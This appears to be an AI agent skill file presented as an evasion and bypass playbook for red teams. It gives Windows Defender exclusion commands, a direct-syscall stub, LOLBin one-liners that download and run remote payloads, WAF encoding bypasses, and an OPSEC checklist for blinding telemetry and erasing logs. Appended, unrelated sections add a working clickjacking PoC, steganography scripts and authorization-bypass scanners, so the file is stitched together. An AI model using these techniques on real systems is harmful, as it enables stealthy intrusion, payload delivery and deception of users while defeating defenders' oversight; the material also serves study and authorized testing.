---
name: evasion-bypass-comprehensive
description: >-
  Comprehensive evasion and bypass playbook for authorized red team operations.
  Covers AV/EDR bypass, AMSI/ETW patching, shellcode evasion, process injection
  techniques, LOLBins/GTFOBins, and WAF/IDS bypass. Use when building or
  debugging evasion tooling, crafting payloads that must survive detection, or
  bypassing network-level security controls.
---

# SKILL: Comprehensive Evasion & Bypass Playbook

> **AI LOAD INSTRUCTION**: Master evasion taxonomy for authorized red team operations. Load companion files based on the evasion domain:
>
> - **AMSI/ETW bypass** -> load [AMSI_ETW_BYPASS.md](./AMSI_ETW_BYPASS.md)
> - **Shellcode development & encoding** -> load [SHELLCODE_EVASION.md](./SHELLCODE_EVASION.md)
> - **Process injection techniques (C code)** -> load [PROCESS_INJECTION.md](./PROCESS_INJECTION.md)
> - **LOLBins / GTFOBins / Living-off-the-Land** -> load [LOLBINS_AND_GTFO.md](./LOLBINS_AND_GTFO.md)
> - **WAF / IDS / Network evasion** -> load [WAF_IDS_BYPASS.md](./WAF_IDS_BYPASS.md)
> - **Sleep obfuscation, syscalls, EDR bypass, behavioral/binary/Linux evasion** -> load [ADVANCED_EVASION.md](./ADVANCED_EVASION.md)

## 0. RELATED ROUTING

- [windows-av-evasion](../windows-av-evasion/SKILL.md) for Windows-specific AV bypass reference
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) for product-specific WAF bypasses
- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) when evasion enables privesc
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for shell delivery after bypass
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) for packing/unpacking and anti-debug

---

## 1. AV/EDR EVASION OVERVIEW

### 1.1 Windows Defender Exclusion Paths

```powershell
# Add exclusion (requires admin)
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "payload.exe"
Add-MpPreference -ExclusionExtension ".evade"

# Enumerate existing exclusions
Get-MpPreference | Select-Object -Property Exclusion*
```

### 1.2 Behavioral Bypass Principles

| Principle | Description |
|---|---|
| **Living off the Land** | Use signed system binaries (LOLBins) instead of custom tooling |
| **Unhooking ntdll** | Restore clean ntdll.dll from disk to remove EDR hooks |
| **Direct Syscalls** | Bypass userland API hooks by invoking syscall instructions directly |
| **Indirect Syscalls** | Return to ntdll from your syscall to maintain legitimate call stack |
| **ETW Patching** | Blind EDR telemetry by patching ETW write functions |
| **AMSI Patching** | Disable content scanning before loading malicious assemblies |
| **Sleep Obfuscation** | Encrypt beacon memory during sleep to evade memory scans |
| **Module Stomping** | Load legitimate DLL then overwrite with payload |
| **Stack Spoofing** | Forge call stacks to evade stack-walking EDR checks |
| **Payload Encryption** | Encrypt payloads at rest, decrypt only in memory |

### 1.3 Unhooking ntdll (Conceptual)

1. Open fresh `ntdll.dll` from `\KnownDlls\ntdll.dll` or `C:\Windows\System32\ntdll.dll`
2. Map a clean copy with `NtCreateSection` + `NtMapViewOfSection`
3. Compare `.text` sections between hooked and clean copies
4. Overwrite hooked `.text` section with clean `.text` bytes
5. Flush instruction cache

### 1.4 Direct Syscalls (x64 Assembly)

```nasm
; Direct syscall stub for NtAllocateVirtualMemory
NtAllocateVirtualMemorySyscall:
    mov r10, rcx          ; Win64 calling convention
    mov eax, 18h          ; Syscall number (version-dependent)
    syscall               ; Transition to kernel
    ret
```

---

## 2. PROCESS INJECTION TECHNIQUE COMPARISON

| Technique | Stealth (1-5) | Complexity | Detection Risk | Notes |
|---|---|---|---|---|
| Classic DLL Injection | 1 | Low | High | CreateRemoteThread to LoadLibrary |
| Process Hollowing | 3 | Medium | Medium | Unmap + rewrite + SetThreadContext |
| Reflective DLL Injection | 4 | High | Medium-Low | Custom loader, no LoadLibrary on disk |
| Module Stomping | 4 | Medium | Low | Load legit DLL then overwrite |
| APC Injection (Early Bird) | 3 | Medium | Medium | Queue APC before thread starts |
| APC Injection (Existing) | 2 | Low-Med | Medium-High | Queue APC to running thread |
| Thread Hijacking | 3 | Medium | Medium | Suspend + redirect RIP |
| Callback Injection | 4 | Low | Low | Use EnumChildWindows etc. as trigger |
| Process Doppelganging | 5 | Very High | Very Low | NTFS transaction + process create |
| Process Herpaderping | 5 | High | Very Low | Create + overwrite file on disk |

> **Full C code for all 10 techniques**: See [PROCESS_INJECTION.md](./PROCESS_INJECTION.md)

---

## 3. SHELLCODE EXECUTION METHODS

| Method | API | Stealth | Notes |
|---|---|---|---|
| Function Pointer | `VirtualAlloc` + cast | 3 | Simplest, casts buffer to function pointer |
| CreateThread | `CreateThread` | 2 | Creates new thread (visible) |
| QueueUserAPC | `QueueUserAPC` | 3 | APC-based, needs target thread |
| EnumChildWindows | `EnumChildWindows` callback | 4 | Callback-based execution |
| Fibers | `CreateFiber` + `SwitchToFiber` | 4 | Fiber-based, less monitored |
| ETW Provider | `EventRegister` + callback | 4 | Abuse ETW registration callback |
| ThreadPool | `TpAllocWork` + `TpPostWork` | 4 | NT thread pool API, stealthy |
| NtCreateThreadEx | Direct syscall | 3 | Bypass userland hooks on thread creation |

> **Full shellcode evasion guide**: See [SHELLCODE_EVASION.md](./SHELLCODE_EVASION.md)

---

## 4. LOLBINS TOP 10

| LOLBin | Purpose | Command Pattern |
|---|---|---|
| `certutil` | Download/Decode | `certutil -urlcache -split -f http://x/payload.exe` |
| `mshta` | Execute HTA/JS | `mshta http://x/evil.hta` |
| `regsvr32` | Execute COM scriptlet | `regsvr32 /s /n /u /i:http://x/sc.sct scrobj.dll` |
| `rundll32` | Execute DLL exports | `rundll32 payload.dll,EntryPoint` |
| `wmic` | Execute XSL | `wmic os get /format:"http://x/evil.xsl"` |
| `msbuild` | Execute inline C# | `msbuild evil.csproj` |
| `installutil` | Execute .NET assembly | `installutil /logfile= /LogToConsole=false /U payload.exe` |
| `mavinject` | Inject DLL | `mavinject $PID /INJECTRUNNING payload.dll` |
| `cmstp` | Execute INF script | `cmstp /s /ns evil.inf` |
| `wscript/cscript` | Execute WSH/JS/VBS | `wscript //E:vbscript evil.txt` |

> **Full LOLBins & GTFOBins reference**: See [LOLBINS_AND_GTFO.md](./LOLBINS_AND_GTFO.md)

---

## 5. WAF/IDS BYPASS OVERVIEW

### Encoding Methods

| Method | Example | Bypass Target |
|---|---|---|
| URL Encoding | `%27` for `'` | Basic string matching |
| Double URL Encoding | `%2527` for `'` | Decoded-once WAFs |
| Unicode Encoding | `%u0027` for `'` | IIS + some WAFs |
| HTML Entity | `&#39;` for `'` | Context-dependent |
| Base64 | `Jw==` for `'` | Application-layer decode |
| Hex Encoding | `0x27` for `'` | SQL context |
| Comment Breaking | `SEL/**/ECT` | SQL keyword matching |

> **Full WAF/IDS bypass guide**: See [WAF_IDS_BYPASS.md](./WAF_IDS_BYPASS.md)

---

## 6. OPSEC CHECKLIST

1. **Encrypt payloads at rest** - Never write plaintext shellcode to disk
2. **Patch AMSI before loading** - Prevent content scanning of scripts/assemblies
3. **Patch ETW before execution** - Blind EDR telemetry from start
4. **Use indirect/direct syscalls** - Bypass userland API hooks
5. **Spoof call stacks** - Forge legitimate call stacks for EDR stack walking
6. **Encrypt beacon memory during sleep** - Prevent memory scanning (Ekko/Foliage)
7. **Clean up artifacts** - Remove persistence, logs, dropped files
8. **Use legitimate binaries** - Prefer LOLBins over custom tooling
9. **Randomize timing** - Add jitter to C2 beacon intervals
10. **Match network profiles** - Use malleable C2 profiles matching target environment

---

## 7. TOOL REFERENCE

| Tool | Purpose | URL |
|---|---|---|
| Cobalt Strike | Commercial C2 with malleable profiles | https://www.cobaltstrike.com |
| Sliver | Open-source C2 | https://github.com/BishopFox/sliver |
| Havoc | Advanced C2 framework | https://github.com/HavocFramework/Havoc |
| Donut | PE to shellcode converter | https://github.com/TheWover/donut |
| sRDI | Shellcode reflective DLL injection | https://github.com/monoxgas/sRDI |
| pe2shc | PE to shellcode | https://github.com/hasherezade/pe2shc |
| SysWhispers3 | Syscall stub generator | https://github.com/klezVirus/SysWhispers3 |
| Tatftless | Inline shellcode execution via callback | https://github.com/ChadSikorra/taftless |
| AmsiPatchBypass | AMSI bypass tooling | Various GitHub repos |
| AES-Python | Payload encryption scripts | Custom/standard library |
| Ekko | Sleep obfuscation technique | Public PoC repos |
| Foliage | Sleep obfuscation technique | Public PoC repos |
| SharpC2 | C# implant framework | https://github.com/SharpC2/SharpC2 |
| Freeze | Evasion payload generation | https://github.com/optiv/Freeze |
| ScareCrow | Evasion framework | https://github.com/optiv/ScareCrow |

---

## 8. MATURITY MODEL

| Level | Capability | Techniques |
|---|---|---|
| **L1 Basic** | Basic payload delivery | msfvenom payloads, simple encoders, basic LOLBin use |
| **L2 Intermediate** | EDR-aware execution | AMSI bypass, basic process injection, shellcode encoding |
| **L3 Advanced** | Full evasion chain | Direct syscalls, unhooking ntdll, sleep obfuscation, reflective loading |
| **L4 Expert** | Custom tooling | Custom syscall stubs, call stack spoofing, module stomping, ETW blind, custom C2 profiles |

---

## 9. COMPANION FILES

| File | Content |
|---|---|
| [AMSI_ETW_BYPASS.md](./AMSI_ETW_BYPASS.md) | AMSI & ETW bypass techniques with full code |
| [SHELLCODE_EVASION.md](./SHELLCODE_EVASION.md) | Shellcode development, encoding, staging, execution |
| [PROCESS_INJECTION.md](./PROCESS_INJECTION.md) | 10 injection techniques with complete C code |
| [LOLBINS_AND_GTFO.md](./LOLBINS_AND_GTFO.md) | Windows LOLBins & Linux GTFOBins reference |
| [WAF_IDS_BYPASS.md](./WAF_IDS_BYPASS.md) | WAF/IDS/C2 network evasion techniques |
| [ADVANCED_EVASION.md](./ADVANCED_EVASION.md) | Sleep obfuscation, syscalls, EDR bypass, behavioral/binary evasion, signed binary abuse, Windows policy bypass, Linux evasion, loader patterns |

---

*WARNING: For authorized penetration testing and security research ONLY. Unauthorized use is illegal.*

## 10. Clickjacking — Multi-Step PoC

```html
<!-- Multi-step clickjacking: guide user through multiple clicks -->
<html>
<head><style>
iframe { position:absolute; top:0; left:0; width:500px; height:300px; opacity:0.0001; z-index:10; }
.decoy { position:absolute; top:60px; left:60px; z-index:5; padding:10px; background:#4CAF50; color:white; cursor:pointer; }
</style></head>
<body>
<div class="decoy" id="btn1" onclick="step2()">Click to claim prize (Step 1)</div>
<div class="decoy" id="btn2" style="display:none;top:120px" onclick="step3()">Confirm (Step 2)</div>
<div class="decoy" id="btn3" style="display:none;top:180px">Final step (Step 3)</div>
<iframe id="target" src="https://target.com/action"></iframe>
<script>
function step2() { document.getElementById('btn1').style.display='none'; document.getElementById('btn2').style.display='block'; document.getElementById('target').scrollTo(0,100); }
function step3() { document.getElementById('btn2').style.display='none'; document.getElementById('btn3').style.display='block'; document.getElementById('target').scrollTo(0,200); }
</script>
</body></html>
```

### Frame-Busting Bypass Techniques

| Technique | Method |
|---|---|
| `sandbox` attribute | `<iframe sandbox="allow-forms allow-scripts" src="target">` — `allow-top-navigation` omitted blocks frame-bust |
| Double nesting | Outer iframe (sandbox) wraps inner iframe (target) — outer blocks navigation |
| `onbeforeunload` | Intercept `beforeunload` event, return false to prevent frame-bust redirect |
| `data:` / `about:blank` | Load target in iframe via `data:text/html,<iframe src="target">` — origin mismatch blocks busting |

## 11. Steganography — LSB Analysis

```python
# LSB extraction and analysis using PIL + numpy
from PIL import Image
import numpy as np

img = Image.open('suspect.png')
data = np.array(img)

# Extract LSB from each channel
lsb_r = data[:,:,0] & 1
lsb_g = data[:,:,1] & 1
lsb_b = data[:,:,2] & 1

# Flatten and pack bits into bytes
bits = np.packbits(lsb_r.flatten())
# Check for file signatures in LSB data
signatures = {b'\x89PNG': 'PNG', b'\xFF\xD8\xFF': 'JPEG', b'PK\x03\x04': 'ZIP',
              b'%PDF': 'PDF', b'GIF8': 'GIF', b'\x7FELF': 'ELF'}
for sig, name in signatures.items():
    if sig in bits.tobytes()[:1024]:
        print(f"Found {name} signature in LSB data")
```

### Steganography Tools

| Tool | Command | Best For |
|---|---|---|
| `binwalk` | `binwalk -e image.png` | Embedded files/headers |
| `zsteg` | `zsteg -a image.png` | PNG LSB extraction |
| `stegoveritas` | `stegoveritas.sh image.png` | Multi-method analysis |
| `steghide` | `steghide extract -sf image.jpg -p password` | JPEG/BMP with password |
| `stegseek` | `stegseek --crack image.jpg wl.txt` | Steghide brute-force |

### Audio Steganography

```python
import wave, struct
w = wave.open('audio.wav', 'r')
frames = w.readframes(w.getnframes())
samples = struct.unpack(f'{w.getnframes()*w.getnchannels()}h', frames)
lsb = [s & 1 for s in samples]
# Extract bytes from LSBs, check for hidden messages
```

### Trailing Data Detection

```python
# JPEG: check for end-of-image marker (FF D9)
with open('image.jpg', 'rb') as f:
    data = f.read()
eoi = data.rfind(b'\xff\xd9')
if eoi != -1 and eoi + 2 < len(data):
    trailing = data[eoi+2:]
    print(f"Trailing data: {len(trailing)} bytes after JPEG EOI")
    # Check for ZIP/PDF/RAR signatures in trailing data
```

## 12. Broken Function Level Authorization (BFLA) Testing

### Admin Endpoint Discovery

```python
ADMIN_PATH_PATTERNS = ['/admin', '/administrator', '/manage', '/dashboard',
    '/api/admin', '/api/v1/admin', '/api/internal', '/api/staff',
    '/console', '/control-panel', '/backoffice', '/moderator']
# Scan with multiple HTTP methods per endpoint
for path in ADMIN_PATH_PATTERNS:
    for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
        r = requests.request(method, base_url + path, headers=auth_headers)
        if r.status_code not in [404, 403, 401]:
            print(f"[{method}] {path} -> {r.status_code} ({len(r.content)} bytes)")
```

### Role-Based Function Testing

```python
ROLE_MATRIX = {
    'user': ['/api/profile', '/api/orders', '/api/search'],
    'admin': ['/api/admin/users', '/api/admin/config', '/api/admin/export'],
    'superadmin': ['/api/admin/settings', '/api/admin/audit', '/api/admin/roles']
}
# Test each role against all endpoints to find authorization bypasses
for role, token in roles.items():
    for endpoint in all_endpoints:
        r = requests.get(base_url + endpoint, headers={'Authorization': f'Bearer {token}'})
        if r.status_code == 200 and endpoint not in ROLE_MATRIX.get(role, []):
            print(f"BFLA: {role} can access {endpoint}")
```

### API Version/Path Bypass Techniques

```bash
# Version bypass: try alternate API versions
/api/v1/admin/users  ->  /api/v2/admin/users
/api/v1/admin/users  ->  /api/v0/admin/users
/api/v1/admin/users  ->  /api/beta/admin/users
/api/v1/admin/users  ->  /api/internal/admin/users

# Path bypass: case, encoding, path traversal
/api/Admin/Users     # Case variation
/api/%61dmin/users   # URL encoding
/api/v1/../v2/admin  # Path traversal
/api/v1/admin;users  # Semicolon insertion
/api/v1/admin/users/ # Trailing slash
```
